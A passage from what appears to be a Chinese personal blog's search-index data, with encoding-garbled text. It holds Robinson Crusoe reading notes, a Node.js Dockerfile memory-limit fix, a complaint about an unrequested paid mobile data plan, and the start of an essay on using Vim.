194åœ¨å»ä¼¦æ•¦çš„è·¯ä¸Šï¼Œä»¥åŠåˆ°äº†ä¼¦æ•¦ä»¥åï¼Œæˆ‘å†…å¿ƒä¸€ç›´å‰§çƒˆæŒ£æ‰ï¼Œæˆ‘åˆ°åº•è¯¥é€‰ä»€ä¹ˆæ ·çš„äººç”Ÿé“è·¯ï¼Œæˆ‘è¯¥å›å®¶è¿˜æ˜¯è¯¥èˆªæµ·ï¼Ÿ\næˆ‘ç›¸ä¿¡ï¼Œæ¯ä¸ªäººéƒ½æœ‰é¢å¯¹äººç”Ÿé“è·¯çš„è‰°éš¾æŠ‰æ‹©çš„æ—¶å€™ã€‚\nç¬¬ä¸‰ç«  è’å²›é‡éš¾æ ‡æ³¨(é»„è‰²) - ä½ç½® 621â€œå› ä¸ºçªæ¥çš„æ¬£å–œï¼Œå¦‚åŒçªæ¥çš„æ‚²ä¼¤ï¼Œéƒ½ä»¤äººéš¾ä»¥æ‰¿å—ã€‚â€\næ‚²ä¼¤ä¸å¿«ä¹éƒ½æ˜¯æ¥è‡ªæ¯”è¾ƒã€‚\nç¬¬å…­ç«  ç”Ÿç—…ä»¥åŠè‰¯å¿ƒæœ‰æ„§æ ‡æ³¨(é»„è‰²) - ä½ç½® 1193å¤§éº¦åˆšåˆšé•¿å‡ºæ¥çš„æ—¶å€™ï¼Œæˆ‘æ›¾æ·±å—æ„ŸåŠ¨ï¼Œç¬¬ä¸€æ¬¡è®¤ä¸ºé‚£æ˜¯ä¸Šå¸æ˜¾ç¤ºçš„ç¥è¿¹ã€‚ä¸è¿‡åæ¥å‘ç°é‚£ä¸æ˜¯ç¥è¿¹ä»¥åï¼Œæ‰€æœ‰ä»å®ƒè€Œæ¥çš„æ„ŸåŠ¨å°±éšä¹‹æ¶ˆå¤±äº†ã€‚\næ— æ³•è§£é‡Šçš„æ—¶å€™ï¼Œæ‰ä¼šæƒ³åˆ°é¬¼ç¥ã€‚\nç¬¬ä¹ç«  å°èˆ¹æ ‡æ³¨(é»„è‰²) - ä½ç½® 1701æˆ‘è®¤ä¸ºï¼Œæˆ‘ä»¬ä¹‹æ‰€ä»¥æ„Ÿåˆ°ç¼ºä¹å’Œä¸æ»¡è¶³ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬å¯¹å·²ç»æ‹¥æœ‰çš„ä¸œè¥¿ç¼ºå°‘æ„Ÿæ©ä¹‹å¿ƒã€‚\nçœ‹åˆ°è‹¹æœåˆå‡ºäº†æ–°æ‰‹æœºï¼Œmacbook proåˆå‡ºäº†æ–°æ¬¾çš„m1ç¬”è®°æœ¬ï¼Œå¯¹æ¯”æˆ‘æœ¬è‡ªå·±ç›®å‰æ‰‹ä¸­æ‰€æ‹¥æœ‰çš„ä¸œè¥¿ï¼Œä½ çœŸçš„çæƒœè¿‡å—ï¼Ÿ å¾—ä¸åˆ°çš„æ°¸è¿œåœ¨éªšåŠ¨ \u0026ndash;ã€Šçº¢ç«ç‘°ã€‹\nç¬¬åç«  é©¯å…»å±±ç¾Šæ ‡æ³¨(é»„è‰²) - ä½ç½® 1797æˆ‘åœ¨ç»Ÿæ²»è¿™å²›â€”â€”æˆ–è€…è¯´ï¼Œè¢«å›šç¦åœ¨è¿™å²›â€”â€”çš„ç¬¬å…­å¹´çš„åä¸€æœˆå…­æ—¥\nä½ åœ¨è·å¾—æ— å°½çš„è‡ªç”±çš„æ—¶å€™ï¼Œä¹Ÿè¢«è‡ªç”±æ‰€å›šç¦ã€‚\nç¬¬åä¸ƒç«  å›ä¹±è€…åˆ°è®¿æ ‡æ³¨(é»„è‰²) - ä½ç½® 3187ä½ çŸ¥é“ï¼Œâ€ä»–è¯´ï¼Œâ€œä»¥è‰²åˆ—çš„ç™¾å§“ä¸€å¼€å§‹è·æ•‘ç¦»å¼€åŸƒåŠçš„æ—¶å€™ï¼Œäººäººæ¬¢æ¬£é¼“èˆï¼Œä½†æ˜¯ï¼Œå½“ä»–ä»¬åœ¨æ—·é‡é‡Œç¼ºä¹é¢åŒ…æ—¶ï¼Œä»–ä»¬ç”šè‡³èƒŒå›äº†æ‹¯æ•‘ä»–ä»¬çš„\näººæ€§è€Œå·²\nç¬¬åä¹ç«  é‡è¿”è‹±å›½æ ‡æ³¨(é»„è‰²) - ä½ç½® 3714ç­‰åŒ»ç”Ÿé—®æ˜äº†ç—…å› ä¹‹åï¼Œä»–ç»™æˆ‘æ”¾äº†è¡€ï¼Œä¹‹åæˆ‘æ‰æ”¾æ¾ä¸‹æ¥ï¼Œé€æ¸å¥½è½¬ã€‚\næˆ‘æ›¾å¬è¿‡æ”¾è¡€ç–—æ³•ï¼Œæ²¡æƒ³åˆ°è¿˜çœŸçš„åœ¨å°è¯´ä¸­çœ‹è¿‡ã€‚\næ ‡æ³¨(é»„è‰²) - ä½ç½® 3715æˆ‘ç›¸ä¿¡ï¼Œå¦‚æœå½“æ—¶æ²¡æœ‰ç”¨æ”¾è¡€æ¥èˆ’ç¼“æˆ‘æ¿€åŠ¨çš„æƒ…ç»ªï¼Œæˆ‘æ—©å°±æ­»äº†ã€‚\nç¬¬äºŒåç«  æ˜ŸæœŸäº”ä¸ç†Šä¹‹æˆ˜æ ‡æ³¨(é»„è‰²) - ä½ç½® 4018é‚£æ¡èˆ¹ä¸Šé™¤äº†ä¸€äº›å¿…éœ€å“ï¼Œæˆ‘è¿˜ç»™ä»–ä»¬é€äº†ä¸ƒä¸ªå¥³äººå»ã€‚å¥¹ä»¬æ˜¯æˆ‘äº²è‡ªé‰´åˆ«çš„ï¼Œæœ‰çš„é€‚äºå¹²æ´»ï¼Œæœ‰çš„é€‚äºåšè€å©†ï¼Œåªè¦é‚£è¾¹æœ‰äººæ„¿æ„å¨¶å¥¹ä»¬ã€‚\næƒŠè®¶äº†ï¼Œé²æ»¨é€Šåœ¨é‚£é‡Œæ‰¾åˆ°çš„å¥³äººï¼Œæ˜¯å¥´éš¶å—ï¼Ÿ\næ ‡æ³¨(é»„è‰²) - ä½ç½® 4025ä»¥åŠæˆ‘ä¸ªäººåœ¨åç»­åå¤šå¹´ä¸­å„ç§æ–°çš„å†’é™©å’Œå¥‡é‡ï¼Œæˆ‘ä¼šåœ¨æˆ‘çš„ç¬¬äºŒéƒ¨å†’é™©æ•…äº‹ä¸­ä¸€ä¸€å™è¿°ã€‚\nå¥½åƒæ²¡æœ‰ç¬¬äºŒéƒ¨å§\n","permalink":"https://wdd.js.org/posts/2021/05/uvq06k/","summary":"ç¬¬ä¸€ç«  äººç”Ÿçš„èµ·ç‚¹æ ‡æ³¨(é»„è‰²) - ä½ç½® 44ä»–å¯¹æˆ‘è¯´ï¼Œåªæœ‰é‚£äº›ç©·åˆ°èµ°æŠ•æ— è·¯ï¼Œæˆ–å¿ƒæ€€å¤§å¿—çš„å·¨å¯Œï¼Œæ‰ä¼šé€‰æ‹©å‡ºæµ·å†’é™©ï¼Œæƒ³è®©è‡ªå·±ä»¥éå‡¡çš„äº‹ä¸šæ‰¬åäºä¸–ã€‚\nèµ°æŠ•æ— è·¯çš„ç©·äººå‰©ä¸‹çš„åªæ˜¯ä½œä¸ºåŠ¨ç‰©çš„æœ¬èƒ½ï¼Œæ€ä¹ˆå¯èƒ½å’Œå¿ƒæ€€å¤§å¿—çš„å·¨å¯Œç›¸æå¹¶è®ºå‘¢\næ ‡æ³¨(é»„è‰²) - ä½ç½® 194åœ¨å»ä¼¦æ•¦çš„è·¯ä¸Šï¼Œä»¥åŠåˆ°äº†ä¼¦æ•¦ä»¥åï¼Œæˆ‘å†…å¿ƒä¸€ç›´å‰§çƒˆæŒ£æ‰ï¼Œæˆ‘åˆ°åº•è¯¥é€‰ä»€ä¹ˆæ ·çš„äººç”Ÿé“è·¯ï¼Œæˆ‘è¯¥å›å®¶è¿˜æ˜¯è¯¥èˆªæµ·ï¼Ÿ\næˆ‘ç›¸ä¿¡ï¼Œæ¯ä¸ªäººéƒ½æœ‰é¢å¯¹äººç”Ÿé“è·¯çš„è‰°éš¾æŠ‰æ‹©çš„æ—¶å€™ã€‚\nç¬¬ä¸‰ç«  è’å²›é‡éš¾æ ‡æ³¨(é»„è‰²) - ä½ç½® 621â€œå› ä¸ºçªæ¥çš„æ¬£å–œï¼Œå¦‚åŒçªæ¥çš„æ‚²ä¼¤ï¼Œéƒ½ä»¤äººéš¾ä»¥æ‰¿å—ã€‚â€\næ‚²ä¼¤ä¸å¿«ä¹éƒ½æ˜¯æ¥è‡ªæ¯”è¾ƒã€‚\nç¬¬å…­ç«  ç”Ÿç—…ä»¥åŠè‰¯å¿ƒæœ‰æ„§æ ‡æ³¨(é»„è‰²) - ä½ç½® 1193å¤§éº¦åˆšåˆšé•¿å‡ºæ¥çš„æ—¶å€™ï¼Œæˆ‘æ›¾æ·±å—æ„ŸåŠ¨ï¼Œç¬¬ä¸€æ¬¡è®¤ä¸ºé‚£æ˜¯ä¸Šå¸æ˜¾ç¤ºçš„ç¥è¿¹ã€‚ä¸è¿‡åæ¥å‘ç°é‚£ä¸æ˜¯ç¥è¿¹ä»¥åï¼Œæ‰€æœ‰ä»å®ƒè€Œæ¥çš„æ„ŸåŠ¨å°±éšä¹‹æ¶ˆå¤±äº†ã€‚\næ— æ³•è§£é‡Šçš„æ—¶å€™ï¼Œæ‰ä¼šæƒ³åˆ°é¬¼ç¥ã€‚\nç¬¬ä¹ç«  å°èˆ¹æ ‡æ³¨(é»„è‰²) - ä½ç½® 1701æˆ‘è®¤ä¸ºï¼Œæˆ‘ä»¬ä¹‹æ‰€ä»¥æ„Ÿåˆ°ç¼ºä¹å’Œä¸æ»¡è¶³ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬å¯¹å·²ç»æ‹¥æœ‰çš„ä¸œè¥¿ç¼ºå°‘æ„Ÿæ©ä¹‹å¿ƒã€‚\nçœ‹åˆ°è‹¹æœåˆå‡ºäº†æ–°æ‰‹æœºï¼Œmacbook proåˆå‡ºäº†æ–°æ¬¾çš„m1ç¬”è®°æœ¬ï¼Œå¯¹æ¯”æˆ‘æœ¬è‡ªå·±ç›®å‰æ‰‹ä¸­æ‰€æ‹¥æœ‰çš„ä¸œè¥¿ï¼Œä½ çœŸçš„çæƒœè¿‡å—ï¼Ÿ å¾—ä¸åˆ°çš„æ°¸è¿œåœ¨éªšåŠ¨ \u0026ndash;ã€Šçº¢ç«ç‘°ã€‹\nç¬¬åç«  é©¯å…»å±±ç¾Šæ ‡æ³¨(é»„è‰²) - ä½ç½® 1797æˆ‘åœ¨ç»Ÿæ²»è¿™å²›â€”â€”æˆ–è€…è¯´ï¼Œè¢«å›šç¦åœ¨è¿™å²›â€”â€”çš„ç¬¬å…­å¹´çš„åä¸€æœˆå…­æ—¥\nä½ åœ¨è·å¾—æ— å°½çš„è‡ªç”±çš„æ—¶å€™ï¼Œä¹Ÿè¢«è‡ªç”±æ‰€å›šç¦ã€‚\nç¬¬åä¸ƒç«  å›ä¹±è€…åˆ°è®¿æ ‡æ³¨(é»„è‰²) - ä½ç½® 3187ä½ çŸ¥é“ï¼Œâ€ä»–è¯´ï¼Œâ€œä»¥è‰²åˆ—çš„ç™¾å§“ä¸€å¼€å§‹è·æ•‘ç¦»å¼€åŸƒåŠçš„æ—¶å€™ï¼Œäººäººæ¬¢æ¬£é¼“èˆï¼Œä½†æ˜¯ï¼Œå½“ä»–ä»¬åœ¨æ—·é‡é‡Œç¼ºä¹é¢åŒ…æ—¶ï¼Œä»–ä»¬ç”šè‡³èƒŒå›äº†æ‹¯æ•‘ä»–ä»¬çš„\näººæ€§è€Œå·²\nç¬¬åä¹ç«  é‡è¿”è‹±å›½æ ‡æ³¨(é»„è‰²) - ä½ç½® 3714ç­‰åŒ»ç”Ÿé—®æ˜äº†ç—…å› ä¹‹åï¼Œä»–ç»™æˆ‘æ”¾äº†è¡€ï¼Œä¹‹åæˆ‘æ‰æ”¾æ¾ä¸‹æ¥ï¼Œé€æ¸å¥½è½¬ã€‚\næˆ‘æ›¾å¬è¿‡æ”¾è¡€ç–—æ³•ï¼Œæ²¡æƒ³åˆ°è¿˜çœŸçš„åœ¨å°è¯´ä¸­çœ‹è¿‡ã€‚\næ ‡æ³¨(é»„è‰²) - ä½ç½® 3715æˆ‘ç›¸ä¿¡ï¼Œå¦‚æœå½“æ—¶æ²¡æœ‰ç”¨æ”¾è¡€æ¥èˆ’ç¼“æˆ‘æ¿€åŠ¨çš„æƒ…ç»ªï¼Œæˆ‘æ—©å°±æ­»äº†ã€‚\nç¬¬äºŒåç«  æ˜ŸæœŸäº”ä¸ç†Šä¹‹æˆ˜æ ‡æ³¨(é»„è‰²) - ä½ç½® 4018é‚£æ¡èˆ¹ä¸Šé™¤äº†ä¸€äº›å¿…éœ€å“ï¼Œæˆ‘è¿˜ç»™ä»–ä»¬é€äº†ä¸ƒä¸ªå¥³äººå»ã€‚å¥¹ä»¬æ˜¯æˆ‘äº²è‡ªé‰´åˆ«çš„ï¼Œæœ‰çš„é€‚äºå¹²æ´»ï¼Œæœ‰çš„é€‚äºåšè€å©†ï¼Œåªè¦é‚£è¾¹æœ‰äººæ„¿æ„å¨¶å¥¹ä»¬ã€‚\næƒŠè®¶äº†ï¼Œé²æ»¨é€Šåœ¨é‚£é‡Œæ‰¾åˆ°çš„å¥³äººï¼Œæ˜¯å¥´éš¶å—ï¼Ÿ\næ ‡æ³¨(é»„è‰²) - ä½ç½® 4025ä»¥åŠæˆ‘ä¸ªäººåœ¨åç»­åå¤šå¹´ä¸­å„ç§æ–°çš„å†’é™©å’Œå¥‡é‡ï¼Œæˆ‘ä¼šåœ¨æˆ‘çš„ç¬¬äºŒéƒ¨å†’é™©æ•…äº‹ä¸­ä¸€ä¸€å™è¿°ã€‚\nå¥½åƒæ²¡æœ‰ç¬¬äºŒéƒ¨å§","title":"é²æ»¨é€Šæ¼‚æµè®° ç¬”è®°ä¸è¯»åæ„Ÿ"},{"content":"ç¯å¢ƒï¼š ARM64\n\u0026lt;--- Last few GCs ---\u0026gt; \u0026lt;--- JS stacktrace ---\u0026gt; # # Fatal process OOM in insufficient memory to create an Isolate # åœ¨Dockerfileä¸Šè®¾ç½®max-old-space-sizeçš„node.jså¯åŠ¨å‚æ•°ï¼Œ äº²æµ‹æœ‰æ•ˆã€‚\nCMD node --report-on-fatalerror --max-old-space-size=1536 dist/index.js Currently, by default v8 has a memory limit of 512mb on 32-bit and 1gb on 64-bit systems. You can raise the limit by setting \u0026ndash;max-old-space-size to a maximum of ~1gb for 32-bit and ~1.7gb for 64-bit systems. But it is recommended to split your single process into several workers if you are hitting memory limits.\nå‚è€ƒ https://nodejs.org/api/cli.html#cli_max_old_space_size_size_in_megabytes https://stackoverflow.com/questions/54919258/ng-commands-throws-insufficient-memory-error-fatal-process-oom-in-insufficient https://medium.com/@vuongtran/how-to-solve-process-out-of-memory-in-node-js-5f0de8f8464c ","permalink":"https://wdd.js.org/fe/oom-in-insufficient-memory/","summary":"ç¯å¢ƒï¼š ARM64\n\u0026lt;--- Last few GCs ---\u0026gt; \u0026lt;--- JS stacktrace ---\u0026gt; # # Fatal process OOM in insufficient memory to create an Isolate # åœ¨Dockerfileä¸Šè®¾ç½®max-old-space-sizeçš„node.jså¯åŠ¨å‚æ•°ï¼Œ äº²æµ‹æœ‰æ•ˆã€‚\nCMD node --report-on-fatalerror --max-old-space-size=1536 dist/index.js Currently, by default v8 has a memory limit of 512mb on 32-bit and 1gb on 64-bit systems. You can raise the limit by setting \u0026ndash;max-old-space-size to a maximum of ~1gb for 32-bit and ~1.7gb for 64-bit systems. But it is recommended to split your single process into several workers if you are hitting memory limits.","title":"Fatal process OOM in insufficient memory to create an Isolate"},{"content":"è”é€šå®˜æ–¹å®¢æœå·²ç»å¼€å§‹å‰²éŸ­èœäº†ã€‚\nå‰ä¸¤å¤©10010ç»™æˆ‘æ‰“ç”µè¯ï¼Œä¸€ä¸ªå¥³å®¢æœæ“ç€æµ“é‡çš„å£éŸ³ï¼Œå…´å¥‹çš„ç»™è¯´æˆ‘æ˜¯ä¼˜è´¨å®¢æˆ·ï¼Œç„¶åå› ä¸ºå›é¦ˆè€ç”¨æˆ·çš„å…³ç³»ï¼Œæ¯ä¸ªæœˆä¼šå¤šé€æˆ‘2ä¸ªGçš„5Gé«˜é€Ÿæµé‡ã€‚\næˆ‘å½“æ—¶å¾ˆè­¦è§‰ï¼Œç«‹é©¬é—®å¥¹è¿™ä¸ªä¼šå¯¹æˆ‘åŸæ¥çš„å¥—é¤æœ‰å½±å“å—ï¼Œå¥¹è¯´æ²¡ä»»ä½•å½±å“ï¼Œæ¥ç€æ®·åˆ‡çš„é—®æˆ‘è¦ä¸è¦åŠç†ã€‚æˆ‘æ€è€ƒäº†ä¸€ä¸‹ï¼Œè§‰å¾—ä¸ç”¨èŠ±é’±ï¼Œåˆå¤šäº†2ä¸ªGçš„æµé‡ï¼Œç´¢æ€§å°±åŠç†äº†ã€‚\nä»Šå¤©æˆ‘åœ¨è”é€šæŒä¸Šè¥ä¸šå…ä¸ŠæŸ¥è‡ªå·±çš„å®æ—¶è¯è´¹ï¼Œçªç„¶å¤šå‡ºäº†ä¸€é¡¹9å…ƒçš„æµé‡å åŠ åŒ…æœˆå¥—é¤è´¹ã€‚çš„ç¡®å¯¹æˆ‘åŸæ¥çš„å¥—é¤æ²¡æœ‰å½±å“ï¼Œåªæ˜¯å¤šäº†ä¸€ä¸ªæ–°çš„ä¸šåŠ¡ã€‚ğŸ˜‚\næˆ‘æ€æ¥æƒ³å»ï¼Œæˆ‘åº”è¯¥æ²¡æœ‰åŠç†è¿™ä¸ªå¥—é¤å•Šï¼Ÿå“ªé‡Œå†’å‡ºæ¥çš„ã€‚ç„¶åä»”ç»†çš„ä»è¿·å®«ä¼¼çš„æŒä¸Šè¥ä¸šå…ä¸ŠæŸ¥æ‰¾å¥—é¤ä¿¡æ¯ã€‚ç»“æœç»™æˆ‘æ‰¾åˆ°äº†ä¸‹é¢çš„ä¿¡æ¯ã€‚\næˆ‘å½“æ—¶å¾ˆç”Ÿæ°”ï¼Œå½“æ—¶å®¢æœç»™æˆ‘ä»‹ç»æµé‡åŒ…çš„æ—¶å€™ï¼Œä»å§‹è‡³ç»ˆæ²¡æœ‰æè¿™ä¸ªæµé‡åŒ…è¦æ”¶è´¹çš„äº‹æƒ…ã€‚æˆ‘ä¹Ÿæ˜¯å¤§æ„äº†ï¼Œæ²¡æœ‰é—ªã€‚\næ¥ç€æˆ‘å°±æ‰“äº†10010çš„å®˜æ–¹å®¢æœï¼Œç„¶åèµ°äººå·¥æŠ•è¯‰ï¼Œæœ€ç»ˆå–æ¶ˆäº†è¿™ä¸ªå¥—é¤ã€‚\næˆ‘æƒ³ï¼Œè¿™ç§ç”µè¯åº”è¯¥å¾ˆå¤šäººéƒ½æ¥è¿‡å§ï¼Œè¢«éª—çš„åº”è¯¥ä¸åªæ˜¯å°‘æ•°ï¼Œå¦‚æœä¸ä»”ç»†çœ‹è‡ªå·±çš„è´¦å•ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æœ‰è¿™ä»¶äº‹æƒ…ã€‚\nä»è¿™ä»¶äº‹äº‹æƒ…æˆ‘ä¹Ÿåçœè‡ªå·±ï¼š\nå®˜æ–¹å®¢æœä¹Ÿä¸è¦ä¿¡ å®¢æœè¯´çš„è¯ï¼Œéƒ½è¦å½“ä½œæ”¾å± æ²¡æœ‰çœ‹åˆ°é»‘çº¸ç™½å­—çš„æ‰¿è¯ºï¼Œéƒ½æ˜¯éª—äººçš„ ä¸è¦æƒ³è´ªå°ä¾¿å®œï¼Œå¦åˆ™è‡ªå·±å°±ä¼šè¢«å½“ä½œéŸ­èœ ","permalink":"https://wdd.js.org/posts/2021/05/ae2rme/","summary":"è”é€šå®˜æ–¹å®¢æœå·²ç»å¼€å§‹å‰²éŸ­èœäº†ã€‚\nå‰ä¸¤å¤©10010ç»™æˆ‘æ‰“ç”µè¯ï¼Œä¸€ä¸ªå¥³å®¢æœæ“ç€æµ“é‡çš„å£éŸ³ï¼Œå…´å¥‹çš„ç»™è¯´æˆ‘æ˜¯ä¼˜è´¨å®¢æˆ·ï¼Œç„¶åå› ä¸ºå›é¦ˆè€ç”¨æˆ·çš„å…³ç³»ï¼Œæ¯ä¸ªæœˆä¼šå¤šé€æˆ‘2ä¸ªGçš„5Gé«˜é€Ÿæµé‡ã€‚\næˆ‘å½“æ—¶å¾ˆè­¦è§‰ï¼Œç«‹é©¬é—®å¥¹è¿™ä¸ªä¼šå¯¹æˆ‘åŸæ¥çš„å¥—é¤æœ‰å½±å“å—ï¼Œå¥¹è¯´æ²¡ä»»ä½•å½±å“ï¼Œæ¥ç€æ®·åˆ‡çš„é—®æˆ‘è¦ä¸è¦åŠç†ã€‚æˆ‘æ€è€ƒäº†ä¸€ä¸‹ï¼Œè§‰å¾—ä¸ç”¨èŠ±é’±ï¼Œåˆå¤šäº†2ä¸ªGçš„æµé‡ï¼Œç´¢æ€§å°±åŠç†äº†ã€‚\nä»Šå¤©æˆ‘åœ¨è”é€šæŒä¸Šè¥ä¸šå…ä¸ŠæŸ¥è‡ªå·±çš„å®æ—¶è¯è´¹ï¼Œçªç„¶å¤šå‡ºäº†ä¸€é¡¹9å…ƒçš„æµé‡å åŠ åŒ…æœˆå¥—é¤è´¹ã€‚çš„ç¡®å¯¹æˆ‘åŸæ¥çš„å¥—é¤æ²¡æœ‰å½±å“ï¼Œåªæ˜¯å¤šäº†ä¸€ä¸ªæ–°çš„ä¸šåŠ¡ã€‚ğŸ˜‚\næˆ‘æ€æ¥æƒ³å»ï¼Œæˆ‘åº”è¯¥æ²¡æœ‰åŠç†è¿™ä¸ªå¥—é¤å•Šï¼Ÿå“ªé‡Œå†’å‡ºæ¥çš„ã€‚ç„¶åä»”ç»†çš„ä»è¿·å®«ä¼¼çš„æŒä¸Šè¥ä¸šå…ä¸ŠæŸ¥æ‰¾å¥—é¤ä¿¡æ¯ã€‚ç»“æœç»™æˆ‘æ‰¾åˆ°äº†ä¸‹é¢çš„ä¿¡æ¯ã€‚\næˆ‘å½“æ—¶å¾ˆç”Ÿæ°”ï¼Œå½“æ—¶å®¢æœç»™æˆ‘ä»‹ç»æµé‡åŒ…çš„æ—¶å€™ï¼Œä»å§‹è‡³ç»ˆæ²¡æœ‰æè¿™ä¸ªæµé‡åŒ…è¦æ”¶è´¹çš„äº‹æƒ…ã€‚æˆ‘ä¹Ÿæ˜¯å¤§æ„äº†ï¼Œæ²¡æœ‰é—ªã€‚\næ¥ç€æˆ‘å°±æ‰“äº†10010çš„å®˜æ–¹å®¢æœï¼Œç„¶åèµ°äººå·¥æŠ•è¯‰ï¼Œæœ€ç»ˆå–æ¶ˆäº†è¿™ä¸ªå¥—é¤ã€‚\næˆ‘æƒ³ï¼Œè¿™ç§ç”µè¯åº”è¯¥å¾ˆå¤šäººéƒ½æ¥è¿‡å§ï¼Œè¢«éª—çš„åº”è¯¥ä¸åªæ˜¯å°‘æ•°ï¼Œå¦‚æœä¸ä»”ç»†çœ‹è‡ªå·±çš„è´¦å•ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æœ‰è¿™ä»¶äº‹æƒ…ã€‚\nä»è¿™ä»¶äº‹äº‹æƒ…æˆ‘ä¹Ÿåçœè‡ªå·±ï¼š\nå®˜æ–¹å®¢æœä¹Ÿä¸è¦ä¿¡ å®¢æœè¯´çš„è¯ï¼Œéƒ½è¦å½“ä½œæ”¾å± æ²¡æœ‰çœ‹åˆ°é»‘çº¸ç™½å­—çš„æ‰¿è¯ºï¼Œéƒ½æ˜¯éª—äººçš„ ä¸è¦æƒ³è´ªå°ä¾¿å®œï¼Œå¦åˆ™è‡ªå·±å°±ä¼šè¢«å½“ä½œéŸ­èœ ","title":"å®˜æ–¹å®¢æœä¹Ÿå¼€å§‹å‰²éŸ­èœ"},{"content":"æˆ‘åªä½¿ç”¨VIMä½œä¸ºä¸»åŠ›å¼€å‘å·¥å…·ï¼Œå·²ç»å¿«åˆ°200å¤©äº†ã€‚èŠèŠè¿™å…¶ä¸­çš„ä¸€äº›æ„Ÿå—ã€‚\nå¯¹å¤§éƒ¨åˆ†æ¥è¯´ï¼Œæåˆ°æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šæƒ³åˆ°word, nodepad++, webstorm, sublime, vscodeã€‚\nè¿™äº›GUIå·¥å…·åœ¨ç»™æˆ‘ä»¬æä¾›ä¾¿åˆ©æ€§çš„åŒæ—¶ï¼Œä¹Ÿåœ¨é€æ¸å›ºåŒ–æˆ‘ä»¬å¯¹äºç¼–è¾‘å™¨çš„è®¤çŸ¥ä¸æ€ç»´æ–¹å¼ã€‚\né—­ä¸Šçœ¼ç›ï¼Œæåˆ°ç¼–è¾‘å™¨ï¼Œä½ è„‘æµ·é‡Œæƒ³åˆ°çš„ç•Œé¢æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ\nå·¦è¾¹ä¸€ä¸ªæ–‡ä»¶æµè§ˆçª—å£ å³è¾¹ä¸€ä¸ªå¤šæ ‡ç­¾é¡µçš„æ–‡ä»¶ç¼–è¾‘çª—å£ é™Œç”Ÿæ„Ÿ æƒ³è±¡ä¸€ä¸‹ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨ç¼–è¾‘å™¨çš„æ—¶å€™ï¼Œå“ªäº›åŠ¨ä½œåšçš„æœ€å¤š\né¼ æ ‡ç§»åŠ¨åˆ°æ–‡ä»¶æµè§ˆçª—å£ï¼Œé€šè¿‡æ»šè½®çš„æ»šåŠ¨ï¼Œæ¥é€‰æ‹©æ–‡ä»¶ï¼Œå•å‡»ä¹‹åï¼Œæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ã€‚ä½†æ˜¯åœ¨VIMä¸Šï¼Œå®Œå…¨æ²¡æœ‰è¿™ç§æ“ä½œã€‚ GUIä¸‹å¯ä»¥åŒæ—¶æ‰“å¼€å¤šä¸ªæ–‡ä»¶ï¼Œè¿›è¡Œç¼–è¾‘ã€‚ä½†æ˜¯å¾ˆå¤šäººè§‰å¾—VIMåªèƒ½æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œç”šè‡³æƒ³æ‰“å¼€å¦ä¸€ä¸ªæ–‡ä»¶çš„æ—¶å€™ï¼Œå…ˆè¦é€€å‡ºVIMã€‚å³ä½¿æ‰“å¼€äº†å¤šä¸ªæ–‡ä»¶ï¼Œä¹Ÿä¸çŸ¥é“è¿™äº›æ–‡ä»¶è¦å¦‚ä½•åˆ‡æ¢ã€‚ ä½†æ˜¯å½“ä½ åˆšå¼€å§‹ä½¿ç”¨VIMçš„æ—¶å€™ï¼Œå¯èƒ½å¹¶æ²¡æœ‰å®‰è£…ä»€ä¹ˆæ’ä»¶ï¼Œè¿™æ—¶å€™ä½ ä¼šæœ‰ä»¥ä¸‹çš„ä¸€äº›å›°æƒ‘\nä½ ç”¨VIMæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åï¼Œæ€ä¹ˆå†æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å‘¢ï¼Ÿå› ä¸ºé»˜è®¤çš„VIMæ˜¯æ²¡æœ‰æ–‡ä»¶æµè§ˆçª—å£çš„ã€‚ä½ åœ¨GUIæ¨¡å¼ä¸‹å…»æˆçš„ç»éªŒï¼Œåœ¨VIMä¸Šå®Œå…¨æ— æ³•ä½¿ç”¨ã€‚ä½ å¯èƒ½ç”šè‡³ä¸çŸ¥é“è¦æ€ä¹ˆé€€å‡ºVIMã€‚æ‰€æœ‰çš„ä¸€åˆ‡éƒ½é‚£ä¹ˆé™Œç”Ÿã€‚\nè™šæ— æ„Ÿ VIMä¸€èˆ¬éƒ½è¿è¡Œåœ¨ç»ˆç«¯ä¹‹ä¸Šï¼Œç»™äººæ„Ÿè§‰äº‘é‡Œé›¾é‡Œï¼Œè™šæ— ç¼¥ç¼ˆã€‚è€Œç¼–è¾‘å™¨å°±ä¸åŒäº†ï¼Œä½ çœ‹åˆ°çš„æ–‡ä»¶å¤¹ï¼Œæ‰“å¼€çš„æ–‡ä»¶ï¼Œå¯¹ä½ æ¥è¯´å°±åƒæ˜¯èº«ä¸Šç©¿çš„è¡£æœï¼Œæ‰‹é‡Œæ¬çš„ç –ã€‚ç»ˆç«¯å‘¢ï¼Œé»‘ä¹ä¹çš„ï¼Œæ²¡å•¥é¢œè‰²ä¸å›¾æ ‡ï¼Œçœ‹èµ·æ¥é‚£ä¹ˆä¸åˆ‡å®é™…ï¼Œä»¿ä½›æ˜¯å¤©è¾¹çš„äº‘å½©ï¼Œåƒå˜ä¸‡åŒ–ï¼Œæ— æ³•ç¢ç£¨ã€‚\nææƒ§æ„Ÿ å¾ˆå¤šäººå¯èƒ½åšè¿‡é‚£ç§æ¢¦ï¼Œå°±æ˜¯åœ¨æ¢¦é‡Œæ„Ÿè§‰è‡ªå·±åœ¨è‡ªç”±è½ä½“ï¼Œç„¶åæƒŠé†’ã€‚åœ¨ä½ ä½¿ç”¨VIMçš„æ—¶å€™ï¼Œå¯èƒ½ä¹Ÿä¼šæœ‰è¿™ç§æ„Ÿè§‰ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªæ–‡ä»¶æˆ‘å†™äº†å‡ 